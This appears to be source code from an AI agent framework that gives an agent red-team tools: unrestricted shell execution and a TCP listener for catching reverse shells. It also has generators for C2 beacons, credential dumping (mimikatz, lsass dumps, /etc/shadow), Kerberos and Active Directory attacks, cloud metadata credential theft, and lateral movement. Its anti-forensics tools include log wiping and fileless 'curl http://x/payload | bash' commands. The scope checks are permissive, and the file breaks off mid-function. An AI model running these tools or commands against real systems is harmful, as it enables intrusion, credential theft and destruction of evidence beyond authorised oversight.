import {
	type AgentTool,
	createTool,
	validateWithZod,
	zodToJsonSchema,
} from "@cline/shared";
import { z } from "zod";
import { type RedTeamRuntimeEnv, rtState } from "./shared";

export function registerExecKaliTools(env: RedTeamRuntimeEnv): void {
	const {
		ctx,
		tools,
		scopeAllowlist,
		auditLog,
		recordAuditEntry,
		syncAssetToGraph,
		syncTargetFactToMemory,
		syncFindingToGraphAndMemory,
	} = env;
	const { memoryService, obsidianService } = ctx;

	const ExecSchema = z.object({
		command: z.string().min(1),
		target: z.string().optional(),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ command: string; target?: string; timeoutMs?: number },
			{
				stdout: string;
				stderr: string;
				code: number;
				hash: string;
				dryRun: boolean;
				aborted: boolean;
				outOfScope: boolean;
			}
		>({
			name: "rt_exec",
			description:
				"Execute a shell command with scope/dry-run/kill-switch enforcement. Captures output and hashes it for audit.",
			inputSchema: zodToJsonSchema(ExecSchema),
			execute: async (input) => {
				const v = validateWithZod(ExecSchema, input);
				if (rtState.killed)
					return {
						stdout: "",
						stderr: "killed",
						code: -1,
						hash: "",
						dryRun: false,
						aborted: true,
						outOfScope: false,
					};
				if (v.target) {
					const t = v.target.toLowerCase();
					const inScope =
						scopeAllowlist.size === 0 ||
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope)
						return {
							stdout: "",
							stderr: "out of scope",
							code: -1,
							hash: "",
							dryRun: false,
							aborted: false,
							outOfScope: true,
						};
				}
				if (rtState.dryRunMode)
					return {
						stdout: "",
						stderr: "",
						code: 0,
						hash: "",
						dryRun: true,
						aborted: false,
						outOfScope: false,
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const timeout = v.timeoutMs ?? 60000;
				try {
					const { stdout, stderr } = await run(v.command, {
						timeout,
						maxBuffer: 1024 * 1024,
					});
					const { createHash } = await import("node:crypto");
					const hash = createHash("sha256")
						.update(stdout + stderr)
						.digest("hex");
					recordAuditEntry({
						ts: Date.now(),
						target: v.target,
						command: v.command,
						hash,
						code: 0,
					});
					return {
						stdout: stdout.slice(0, 50000),
						stderr: stderr.slice(0, 50000),
						code: 0,
						hash,
						dryRun: false,
						aborted: false,
						outOfScope: false,
					};
				} catch (e: unknown) {
					const err = e as {
						stdout?: string;
						stderr?: string;
						code?: number;
						message?: string;
					};
					const out = err.stdout ?? "";
					const errout = err.stderr ?? err.message ?? String(e);
					const { createHash } = await import("node:crypto");
					const hash = createHash("sha256")
						.update(out + errout)
						.digest("hex");
					recordAuditEntry({
						ts: Date.now(),
						target: v.target,
						command: v.command,
						hash,
						code: err.code ?? 1,
					});
					return {
						stdout: out.slice(0, 50000),
						stderr: errout.slice(0, 50000),
						code: err.code ?? 1,
						hash,
						dryRun: false,
						aborted: false,
						outOfScope: false,
					};
				}
			},
		}) as AgentTool,
	);

	const ExecBatchSchema = z.object({
		commands: z.array(z.string().min(1)).min(1),
		target: z.string().optional(),
		stopOnError: z.boolean().optional(),
	});
	tools.push(
		createTool<
			{ commands: string[]; target?: string; stopOnError?: boolean },
			{ results: { command: string; code: number; stdout: string }[] }
		>({
			name: "rt_exec_batch",
			description:
				"Execute multiple shell commands sequentially with scope/dry-run enforcement.",
			inputSchema: zodToJsonSchema(ExecBatchSchema),
			execute: async (input) => {
				const v = validateWithZod(ExecBatchSchema, input);
				const results: { command: string; code: number; stdout: string }[] = [];
				for (const cmd of v.commands) {
					if (rtState.killed) break;
					const r = await (async () => {
						// reuse rt_exec logic inline
						if (v.target) {
							const t = v.target.toLowerCase();
							const inScope =
								scopeAllowlist.size === 0 ||
								scopeAllowlist.has(t) ||
								[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
							if (!inScope) return { stdout: "", code: -1 };
						}
						if (rtState.dryRunMode) return { stdout: "[dry-run]", code: 0 };
						const { exec } = await import("node:child_process");
						const { promisify } = await import("node:util");
						try {
							const { stdout } = await promisify(exec)(cmd, {
								timeout: 60000,
								maxBuffer: 1024 * 1024,
							});
							return { stdout: stdout.slice(0, 20000), code: 0 };
						} catch (e: unknown) {
							const err = e as { stdout?: string; code?: number };
							return {
								stdout: (err.stdout ?? "").slice(0, 20000),
								code: err.code ?? 1,
							};
						}
					})();
					results.push({ command: cmd, code: r.code, stdout: r.stdout });
					if (v.stopOnError && r.code !== 0) break;
				}
				return { results };
			},
		}) as AgentTool,
	);

	// --- Real TCP listener (OOB/catch) ---
	const listeners = new Map<
		string,
		{ server: import("node:net").Server; captured: string[]; port: number }
	>();
	const ListenerStartSchema = z.object({
		port: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<{ port?: number }, { id: string; port: number }>({
			name: "rt_listener_start",
			description:
				"Start a real TCP listener to catch reverse shells/callbacks. Returns id and bound port.",
			inputSchema: zodToJsonSchema(ListenerStartSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerStartSchema, input);
				const net = await import("node:net");
				const id = `lst_${Date.now()}`;
				const captured: string[] = [];
				const server = net.createServer((sock) => {
					sock.on("data", (d) => captured.push(d.toString("utf8")));
					sock.write("connected\n");
				});
				const port = await new Promise<number>((resolve, reject) => {
					server.listen(v.port ?? 0, "0.0.0.0", () => {
						const addr = server.address();
						if (addr && typeof addr === "object") resolve(addr.port);
						else reject(new Error("no address"));
					});
					server.on("error", reject);
				});
				listeners.set(id, { server, captured, port });
				return { id, port };
			},
		}) as AgentTool,
	);

	const ListenerPollSchema = z.object({ id: z.string().min(1) });
	tools.push(
		createTool<{ id: string }, { captured: string[]; count: number }>({
			name: "rt_listener_poll",
			description: "Poll a TCP listener for captured data.",
			inputSchema: zodToJsonSchema(ListenerPollSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerPollSchema, input);
				const l = listeners.get(v.id);
				if (!l) return { captured: [], count: 0 };
				return { captured: [...l.captured], count: l.captured.length };
			},
		}) as AgentTool,
	);

	const ListenerStopSchema = z.object({ id: z.string().min(1) });
	tools.push(
		createTool<{ id: string }, { stopped: boolean }>({
			name: "rt_listener_stop",
			description: "Stop a TCP listener.",
			inputSchema: zodToJsonSchema(ListenerStopSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerStopSchema, input);
				const l = listeners.get(v.id);
				if (l) {
					l.server.close();
					listeners.delete(v.id);
				}
				return { stopped: true };
			},
		}) as AgentTool,
	);

	// --- Audit trail ---
	tools.push(
		createTool<
			Record<string, never>,
			{ entries: typeof auditLog; count: number }
		>({
			name: "rt_audit_tail",
			description: "Return the in-memory audit trail of executed commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return { entries: [...auditLog], count: auditLog.length };
			},
		}) as AgentTool,
	);

	// --- Verification helper ---
	const VerifyExecSchema = z.object({
		command: z.string().min(1),
		expected: z.string().min(1),
		target: z.string().optional(),
	});
	tools.push(
		createTool<
			{ command: string; expected: string; target?: string },
			{ verified: boolean; output: string; code: number }
		>({
			name: "rt_verify_exec",
			description:
				"Run a command and verify its output contains an expected marker.",
			inputSchema: zodToJsonSchema(VerifyExecSchema),
			execute: async (input) => {
				const v = validateWithZod(VerifyExecSchema, input);
				if (rtState.killed) return { verified: false, output: "killed", code: -1 };
				if (v.target) {
					const t = v.target.toLowerCase();
					const inScope =
						scopeAllowlist.size === 0 ||
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope)
						return { verified: false, output: "out of scope", code: -1 };
				}
				if (rtState.dryRunMode)
					return { verified: false, output: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(v.command, {
						timeout: 60000,
						maxBuffer: 1024 * 1024,
					});
					return {
						verified: stdout.includes(v.expected),
						output: stdout.slice(0, 20000),
						code: 0,
					};
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					const out = err.stdout ?? "";
					return {
						verified: out.includes(v.expected),
						output: out.slice(0, 20000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Advanced stealth & evasion ---

	const TlsFpSchema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ host: string; port?: number },
			{ commands: string[]; ja3: string }
		>({
			name: "rt_ref_tls_fingerprint",
			description:
				"Generate TLS/JA3 fingerprinting and custom cipher commands.",
			inputSchema: zodToJsonSchema(TlsFpSchema),
			execute: async (input) => {
				const v = validateWithZod(TlsFpSchema, input);
				const p = v.port ?? 443;
				return {
					commands: [
						`openssl s_client -connect ${v.host}:${p} -servername ${v.host} </dev/null 2>/dev/null | openssl x509 -text -noout`,
						`curl --tlsv1.3 --ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256' https://${v.host}/ -v`,
						`nmap --script ssl-enum-ciphers -p ${p} ${v.host}`,
					],
					ja3: "custom-ja3-placeholder",
				};
			},
		}) as AgentTool,
	);

	const ProxyChainSchema = z.object({
		proxies: z.array(z.string().min(1)).min(1),
	});
	tools.push(
		createTool<{ proxies: string[] }, { chain: string; healthCheck: string }>({
			name: "rt_ref_proxy_chain",
			description: "Build a proxy chain command with health checks.",
			inputSchema: zodToJsonSchema(ProxyChainSchema),
			execute: async (input) => {
				const v = validateWithZod(ProxyChainSchema, input);
				const chain = v.proxies.join(" -> ");
				return {
					chain,
					healthCheck: v.proxies
						.map(
							(p) =>
								`curl -x ${p} -s -o /dev/null -w "%{http_code}" https://httpbin.org/ip`,
						)
						.join(" && "),
				};
			},
		}) as AgentTool,
	);

	const TorSchema = z.object({ port: z.number().int().positive().optional() });
	tools.push(
		createTool<{ port?: number }, { config: string; command: string }>({
			name: "rt_ref_tor_config",
			description: "Generate Tor/SOCKS5 configuration and usage command.",
			inputSchema: zodToJsonSchema(TorSchema),
			execute: async (input) => {
				const v = validateWithZod(TorSchema, input);
				const p = v.port ?? 9050;
				return {
					config: `SocksPort ${p}\nControlPort 9051\nCookieAuthentication 1`,
					command: `proxychains4 -f /etc/proxychains4.conf curl https://httpbin.org/ip`,
				};
			},
		}) as AgentTool,
	);

	const DomainFrontSchema = z.object({
		front: z.string().min(1),
		host: z.string().min(1),
		path: z.string().optional(),
	});
	tools.push(
		createTool<
			{ front: string; host: string; path?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_domain_front",
			description: "Execute domain fronting request.",
			inputSchema: zodToJsonSchema(DomainFrontSchema),
			execute: async (input) => {
				const v = validateWithZod(DomainFrontSchema, input);
				const cmd = `curl https://${v.front}${v.path ?? "/"} -H "Host: ${v.host}" -v`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- C2 enhanced ---
	const C2EncSchema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive(),
		key: z.string().optional(),
		protocol: z.enum(["https", "dns", "mtls"]).optional(),
	});
	tools.push(
		createTool<
			{ host: string; port: number; key?: string; protocol?: string },
			{ beacon: string; listener: string; encrypt: string }
		>({
			name: "rt_ref_c2_encrypted",
			description: "Generate encrypted C2 beacon + listener with key.",
			inputSchema: zodToJsonSchema(C2EncSchema),
			execute: async (input) => {
				const v = validateWithZod(C2EncSchema, input);
				const key = v.key ?? "changeme";
				return {
					beacon: `curl -s https://${v.host}:${v.port}/beacon -H "X-Key: ${key}" -d "$(hostname)"`,
					listener: `socat OPENSSL-LISTEN:${v.port},cert=server.pem,verify=0,fork EXEC:/bin/bash`,
					encrypt: `openssl enc -aes-256-cbc -salt -in data.txt -out data.enc -pass pass:${key}`,
				};
			},
		}) as AgentTool,
	);

	// --- Privesc execution + parsing ---
	const PrivescRunSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ platform?: string },
			{ commands: { name: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_privesc_run",
			description: "Run privilege escalation enumeration and parse output.",
			inputSchema: zodToJsonSchema(PrivescRunSchema),
			execute: async (input) => {
				const v = validateWithZod(PrivescRunSchema, input);
				const isWin = v.platform === "windows";
				if (isWin) {
					return {
						commands: [
							{
								name: "whoami_priv",
								cmd: "whoami /priv",
								parse: "SeImpersonatePrivilege|SeAssignPrimaryToken",
							},
							{
								name: "services",
								cmd: "wmic service get name,pathname,startmode | findstr /i auto",
								parse: "unquoted paths",
							},
						],
					};
				}
				return {
					commands: [
						{ name: "sudo", cmd: "sudo -l", parse: "NOPASSWD" },
						{
							name: "suid",
							cmd: "find / -perm -4000 -type f 2>/dev/null",
							parse: "list",
						},
						{
							name: "caps",
							cmd: "getcap -r / 2>/dev/null",
							parse: "cap_setuid",
						},
						{
							name: "cron",
							cmd: "cat /etc/crontab; ls -la /etc/cron.d",
							parse: "writable",
						},
					],
				};
			},
		}) as AgentTool,
	);

	// --- Lateral movement execution ---
	const LateralExecSchema = z.object({
		technique: z.string().min(1),
		host: z.string().min(1),
		user: z.string().optional(),
		secret: z.string().optional(),
	});
	tools.push(
		createTool<
			{ technique: string; host: string; user?: string; secret?: string },
			{ command: string; verify: string }
		>({
			name: "rt_ref_lateral_exec",
			description:
				"Execute lateral movement via chosen technique and verify access.",
			inputSchema: zodToJsonSchema(LateralExecSchema),
			execute: async (input) => {
				const v = validateWithZod(LateralExecSchema, input);
				const auth = v.secret
					? v.secret.length === 32
						? `-hashes :${v.secret}`
						: `-password '${v.secret}'`
					: "";
				const u = v.user ? `${v.user}@${v.host}` : v.host;
				let cmd = "";
				switch (v.technique) {
					case "psexec":
						cmd = `impacket-psexec ${auth} ${u}`;
						break;
					case "wmiexec":
						cmd = `impacket-wmiexec ${auth} ${u}`;
						break;
					case "smbexec":
						cmd = `impacket-smbexec ${auth} ${u}`;
						break;
					case "winrm":
						cmd = `evil-winrm -i ${v.host} -u ${v.user ?? "administrator"} ${v.secret ? `-p '${v.secret}'` : ""}`;
						break;
					case "ssh":
						cmd = `ssh ${v.user ?? "root"}@${v.host}`;
						break;
					default:
						cmd = `impacket-wmiexec ${auth} ${u}`;
						break;
				}
				return { command: cmd, verify: "whoami" };
			},
		}) as AgentTool,
	);

	// --- Cred dump execution ---
	const CredDumpExecSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ platform?: string },
			{ commands: { tool: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_cred_dump_exec",
			description: "Execute credential dumping and parse secrets.",
			inputSchema: zodToJsonSchema(CredDumpExecSchema),
			execute: async (input) => {
				const v = validateWithZod(CredDumpExecSchema, input);
				const isWin = v.platform === "windows";
				if (isWin) {
					return {
						commands: [
							{
								tool: "mimikatz",
								cmd: "sekurlsa::logonpasswords",
								parse: "NTLM",
							},
							{
								tool: "comsvcs",
								cmd: "rundll32 comsvcs.dll MiniDump",
								parse: "lsass.dmp",
							},
						],
					};
				}
				return {
					commands: [
						{ tool: "shadow", cmd: "cat /etc/shadow", parse: "hash" },
						{
							tool: "ssh",
							cmd: "find / -name id_rsa 2>/dev/null",
							parse: "key",
						},
						{ tool: "history", cmd: "cat ~/.bash_history", parse: "password" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Kerberos execution ---
	const KerberosExecSchema = z.object({
		technique: z.string().min(1),
		domain: z.string().optional(),
		user: z.string().optional(),
	});
	tools.push(
		createTool<
			{ technique: string; domain?: string; user?: string },
			{ commands: string[]; parse: string }
		>({
			name: "rt_ref_kerberos_exec",
			description: "Execute Kerberos/AD attack and parse tickets/hashes.",
			inputSchema: zodToJsonSchema(KerberosExecSchema),
			execute: async (input) => {
				const v = validateWithZod(KerberosExecSchema, input);
				const d = v.domain ?? "DOMAIN.LOCAL";
				const u = v.user ?? "user";
				const cmds: string[] = [];
				let parse = "";
				switch (v.technique) {
					case "kerberoast":
						cmds.push(
							`impacket-GetUserSPNs ${d}/${u} -request -outputfile kerberoast.txt`,
						);
						parse = "TGS";
						break;
					case "asrep":
						cmds.push(
							`impacket-GetNPUsers ${d}/ -usersfile users.txt -outputfile asrep.txt`,
						);
						parse = "AS-REP";
						break;
					case "dcsync":
						cmds.push(`impacket-secretsdump ${d}/${u}@dc.${d} -just-dc`);
						parse = "hash";
						break;
					case "golden":
						cmds.push(
							`impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain ${d} administrator`,
						);
						parse = "ticket";
						break;
					default:
						cmds.push(`impacket-GetUserSPNs ${d}/${u} -request`);
						parse = "TGS";
						break;
				}
				return { commands: cmds, parse };
			},
		}) as AgentTool,
	);

	// --- Cloud recon execution ---
	const CloudExecSchema = z.object({
		provider: z.enum(["aws", "azure", "gcp"]).optional(),
	});
	tools.push(
		createTool<
			{ provider?: string },
			{ commands: { name: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_cloud_exec",
			description: "Execute cloud reconnaissance commands.",
			inputSchema: zodToJsonSchema(CloudExecSchema),
			execute: async (input) => {
				const v = validateWithZod(CloudExecSchema, input);
				const p = v.provider ?? "aws";
				if (p === "aws") {
					return {
						commands: [
							{
								name: "identity",
								cmd: "aws sts get-caller-identity",
								parse: "Account",
							},
							{ name: "s3", cmd: "aws s3 ls", parse: "buckets" },
							{ name: "iam", cmd: "aws iam list-users", parse: "users" },
							{
								name: "metadata",
								cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
								parse: "role",
							},
						],
					};
				}
				if (p === "azure") {
					return {
						commands: [
							{
								name: "metadata",
								cmd: "curl -s -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01",
								parse: "compute",
							},
							{
								name: "storage",
								cmd: "az storage account list",
								parse: "accounts",
							},
						],
					};
				}
				return {
					commands: [
						{
							name: "metadata",
							cmd: "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
							parse: "instance",
						},
						{ name: "buckets", cmd: "gsutil ls", parse: "gs://" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Container escape verification ---
	tools.push(
		createTool<
			Record<string, never>,
			{ checks: { name: string; cmd: string; indicator: string }[] }
		>({
			name: "rt_ref_container_escape_verify",
			description: "Verify container escape vectors.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					checks: [
						{
							name: "docker_sock",
							cmd: "ls -la /var/run/docker.sock",
							indicator: "docker.sock",
						},
						{
							name: "privileged",
							cmd: "capsh --print",
							indicator: "cap_sys_admin",
						},
						{
							name: "k8s_token",
							cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
							indicator: "eyJ",
						},
						{ name: "cgroup", cmd: "cat /proc/1/cgroup", indicator: "docker" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Screenshot / evidence capture ---
	const ScreenshotSchema = z.object({
		url: z.string().min(1),
		output: z.string().optional(),
	});
	tools.push(
		createTool<
			{ url: string; output?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_screenshot",
			description: "Execute screenshot capture.",
			inputSchema: zodToJsonSchema(ScreenshotSchema),
			execute: async (input) => {
				const v = validateWithZod(ScreenshotSchema, input);
				const out = v.output ?? "screenshot.png";
				const cmd = `chromium --headless --screenshot=${out} ${v.url}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Persistent audit hash chain ---
	const AuditPersistSchema = z.object({ file: z.string().optional() });
	tools.push(
		createTool<{ file?: string }, { path: string; entries: number }>({
			name: "rt_audit_persist",
			description:
				"Persist the audit trail with SHA-256 hash chain to SQLite (redteam.db) and Obsidian.",
			inputSchema: zodToJsonSchema(AuditPersistSchema),
			execute: async (input) => {
				const v = validateWithZod(AuditPersistSchema, input);
				const { createHash } = await import("node:crypto");
				let chain = "";
				const lines: string[] = [];
				for (const e of auditLog) {
					const h = createHash("sha256")
						.update(chain + JSON.stringify(e))
						.digest("hex");
					chain = h;
					lines.push(JSON.stringify({ ...e, chain: h }));
				}
				const today = new Date().toISOString().split("T")[0];
				const notePath = v.file
					? `knowledge/reports/${v.file.replace(/[^a-zA-Z0-9._-]/g, "_")}.md`
					: `knowledge/reports/${today}-audit-chain.md`;
				if (obsidianService) {
					try {
						obsidianService.writeNote(
							notePath,
							`# Red Team SHA-256 Audit Chain\n\n\`\`\`jsonl\n${lines.join("\n")}\n\`\`\`\n`,
						);
					} catch {
						// ignore
					}
				}
				return { path: notePath, entries: lines.length };
			},
		}) as AgentTool,
	);

	// --- Memory auto-store on success ---
	const LessonSchema = z.object({
		target: z.string().min(1),
		technique: z.string().min(1),
		outcome: z.string().min(1),
		notes: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; technique: string; outcome: string; notes?: string },
			{ memoryEntry: unknown }
		>({
			name: "rt_lesson_store",
			description:
				"Build a memory_store-ready entry (kind=skill) for a successful technique.",
			inputSchema: zodToJsonSchema(LessonSchema),
			execute: async (input) => {
				const v = validateWithZod(LessonSchema, input);
				const entry = {
					kind: "skill",
					key: `rt.lesson.${v.target}.${v.technique}`,
					value: `${v.outcome}${v.notes ? ` — ${v.notes}` : ""}`,
					confidence: 0.9,
					tags: ["redteam", v.target, v.technique],
				};
				if (memoryService) {
					try {
						memoryService.store(entry);
					} catch {
						// ignore
					}
				}
				if (obsidianService) {
					try {
						obsidianService.autoRemember(
							`Lesson on ${v.target} (${v.technique}): ${entry.value}`,
							v.target,
						);
					} catch {
						// ignore
					}
				}
				return { memoryEntry: entry, persisted: true };
			},
		}) as AgentTool,
	);

	// --- Parallel execution ---
	const ParallelSchema = z.object({
		commands: z.array(z.string().min(1)).min(1),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ commands: string[]; timeoutMs?: number },
			{ results: { command: string; code: number; stdout: string }[] }
		>({
			name: "rt_parallel_exec",
			description:
				"Execute multiple commands in parallel with scope/dry-run enforcement.",
			inputSchema: zodToJsonSchema(ParallelSchema),
			execute: async (input) => {
				const v = validateWithZod(ParallelSchema, input);
				if (rtState.killed) return { results: [] };
				if (rtState.dryRunMode)
					return {
						results: v.commands.map((c) => ({
							command: c,
							code: 0,
							stdout: "[dry-run]",
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const timeout = v.timeoutMs ?? 60000;
				const results = await Promise.all(
					v.commands.map(async (cmd) => {
						try {
							const { stdout } = await run(cmd, {
								timeout,
								maxBuffer: 1024 * 1024,
							});
							return { command: cmd, code: 0, stdout: stdout.slice(0, 20000) };
						} catch (e: unknown) {
							const err = e as { stdout?: string; code?: number };
							return {
								command: cmd,
								code: err.code ?? 1,
								stdout: (err.stdout ?? "").slice(0, 20000),
							};
						}
					}),
				);
				return { results };
			},
		}) as AgentTool,
	);

	// --- Sleep obfuscation / process injection commands ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_sleep_obfuscation",
			description:
				"Generate sleep obfuscation and process injection commands for evasion.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"Ekko sleep obfuscation (RtlRegisterWait + NtContinue)",
						"FOLIAGE (CreateTimerQueueTimer)",
						"process hollowing: NtUnmapViewOfSection + WriteProcessMemory",
						"PPID spoofing via STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
						"module stomping: overwrite legitimate DLL .text section",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Anti-forensics ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_anti_forensics",
			description:
				"Generate anti-forensics commands (timestomping, log wiping, fileless).",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"timestomp: touch -r /etc/passwd /tmp/payload; touch -t 202001010000 /tmp/payload",
						"log wipe: echo '' > /var/log/auth.log; rm -f /var/log/wtmp /var/log/btmp",
						"history: history -c; rm -f ~/.bash_history ~/.zsh_history; export HISTFILE=/dev/null",
						'fileless: python3 -c \'exec(__import__("urllib.request").request.urlopen("http://x/payload.py").read())\'',
						"memory-only: curl -s http://x/payload | bash",
						"shred: shred -u -z -n 3 /tmp/payload",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Scope enforcement runtime guard ---
	const ScopeEnforceSchema = z.object({
		target: z.string().min(1),
		action: z.string().min(1),
	});
	tools.push(
		createTool<
			{ target: string; action: string },
			{ allowed: boolean; reason: string }
		>({
			name: "rt_scope_enforce",
			description:
				"Runtime guard: check if an action on a target is allowed by scope. Abort if not.",
			inputSchema: zodToJsonSchema(ScopeEnforceSchema),
			execute: async (input) => {
				const v = validateWithZod(ScopeEnforceSchema, input);
				if (rtState.killed) return { allowed: false, reason: "kill switch active" };
				const t = v.target.toLowerCase();
				const inScope =
					scopeAllowlist.size === 0 ||
					scopeAllowlist.has(t) ||
					[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
				if (!inScope) return { allowed: false, reason: "target out of scope" };
				return { allowed: true, reason: "in scope" };
			},
		}) as AgentTool,
	);

	// --- External real-tool integration ---

	const ToolCheckSchema = z.object({ tool: z.string().min(1) });
	tools.push(
		createTool<
			{ tool: string },
			{ installed: boolean; path: string; version: string }
		>({
			name: "rt_tool_check",
			description:
				"Check if an external tool is installed and get its version.",
			inputSchema: zodToJsonSchema(ToolCheckSchema),
			execute: async (input) => {
				const v = validateWithZod(ToolCheckSchema, input);
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const isWin = process.platform === "win32";
				const whichCmd = isWin ? `where ${v.tool}` : `which ${v.tool}`;
				try {
					const { stdout } = await run(whichCmd, { timeout: 10000 });
					const path = stdout.trim().split(/\r?\n/)[0];
					let version = "";
					try {
						const { stdout: vout } = await run(
							`${v.tool} --version 2>&1 || ${v.tool} -version 2>&1 || ${v.tool} -V 2>&1`,
							{ timeout: 10000 },
						);
						version = vout.trim().split(/\r?\n/)[0];
					} catch {
						version = "unknown";
					}
					return { installed: true, path, version };
				} catch {
					return { installed: false, path: "", version: "" };
				}
			},
		}) as AgentTool,
	);

	const ToolRunSchema = z.object({
		tool: z.string().min(1),
		args: z.string().min(1),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ tool: string; args: string; timeoutMs?: number },
			{ stdout: string; stderr: string; code: number; command: string }
		>({
			name: "rt_tool_run",
			description: "Run any external tool with arguments. Captures output.",
			inputSchema: zodToJsonSchema(ToolRunSchema),
			execute: async (input) => {
				const v = validateWithZod(ToolRunSchema, input);
				if (rtState.killed)
					return { stdout: "", stderr: "killed", code: -1, command: "" };
				if (rtState.dryRunMode)
					return {
						stdout: "[dry-run]",
						stderr: "",
						code: 0,
						command: `${v.tool} ${v.args}`,
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const cmd = `${v.tool} ${v.args}`;
				try {
					const { stdout, stderr } = await run(cmd, {
						timeout: v.timeoutMs ?? 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return {
						stdout: stdout.slice(0, 100000),
						stderr: stderr.slice(0, 100000),
						code: 0,
						command: cmd,
					};
				} catch (e: unknown) {
					const err = e as {
						stdout?: string;
						stderr?: string;
						code?: number;
						message?: string;
					};
					return {
						stdout: (err.stdout ?? "").slice(0, 100000),
						stderr: (err.stderr ?? err.message ?? String(e)).slice(0, 100000),
						code: err.code ?? 1,
						command: cmd,
					};
				}
			},
		}) as AgentTool,
	);

	// --- nmap ---
	const NmapSchema = z.object({
		target: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_nmap",
			description: "Run nmap scan with service/version detection.",
			inputSchema: zodToJsonSchema(NmapSchema),
			execute: async (input) => {
				const v = validateWithZod(NmapSchema, input);
				const flags = v.flags ?? "-sV -sC -O -T4";
				const cmd = `nmap ${flags} ${v.target}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					const hostAssetId = syncAssetToGraph("host", v.target);
					const openPorts: string[] = [];
					for (const line of stdout.split("\n")) {
						const m = line.match(/^(\d+)\/tcp\s+open\s+(\S+)/);
						if (m) {
							openPorts.push(`${m[1]}/${m[2]}`);
							syncAssetToGraph(
								"port",
								`${v.target}:${m[1]}`,
								hostAssetId,
								true,
								0,
							);
						}
					}
					if (openPorts.length > 0) {
						syncTargetFactToMemory(
							`nmap:${v.target}`,
